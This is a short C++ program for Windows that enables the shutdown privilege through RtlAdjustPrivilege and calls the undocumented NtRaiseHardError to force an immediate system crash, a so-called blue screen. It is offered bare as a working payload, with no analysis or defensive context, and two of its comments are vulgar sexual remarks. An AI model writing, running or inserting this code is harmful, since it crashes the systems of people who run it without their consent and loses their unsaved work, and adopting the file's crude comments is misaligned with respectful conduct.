//creator Dot.NET#2235

#include <Windows.h>
#include <winternl.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib") // Please sex me

using namespace std;

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

int main() {
	BOOLEAN PrivilegeState = FALSE;
	ULONG ErrorResponse = 0;
	RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
	NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // Suck My Dick
	return 0;
}

